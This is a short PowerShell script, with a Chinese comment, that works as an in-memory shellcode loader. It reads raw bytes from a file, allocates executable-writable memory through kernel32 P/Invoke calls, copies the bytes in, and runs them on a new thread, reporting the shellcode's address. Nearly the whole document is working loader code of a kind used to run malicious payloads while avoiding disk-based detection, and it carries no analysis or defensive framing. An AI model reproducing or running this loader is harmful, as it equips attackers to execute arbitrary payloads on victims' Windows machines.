param([Parameter(Mandatory=$true)][string]$Path)

$bytes = [System.IO.File]::ReadAllBytes((Resolve-Path $Path))

# 清理可能导致 csc 编译警告的环境变量
$env:LIB = ""

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public static class Runner {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
    [DllImport("kernel32.dll")]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
    [DllImport("kernel32.dll")]
    public static extern uint WaitForSingleObjectEx(IntPtr hHandle, uint dwMilliseconds, bool bAlertable);
    [DllImport("kernel32.dll")]
    public static extern bool VirtualFree(IntPtr lpAddress, UIntPtr dwSize, uint dwFreeType);
}
"@

$addr = [Runner]::VirtualAlloc([IntPtr]::Zero, [UIntPtr]::new($bytes.Length), 0x3000, 0x40)
if ($addr -eq [IntPtr]::Zero) { Write-Host "[!] VirtualAlloc failed"; exit 1 }

[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $addr, $bytes.Length)

$tid = [uint32]0
$h = [Runner]::CreateThread([IntPtr]::Zero, [UIntPtr]::Zero, $addr, [IntPtr]::Zero, 0, [ref]$tid)
if ($h -eq [IntPtr]::Zero) { Write-Host "[!] CreateThread failed"; exit 1 }

Write-Host "[*] thread started, shellcode @ $addr"
[Runner]::WaitForSingleObjectEx($h, [uint32]0xFFFFFFFF, $true) | Out-Null
[Runner]::VirtualFree($addr, [UIntPtr]::Zero, 0x8000) | Out-Null
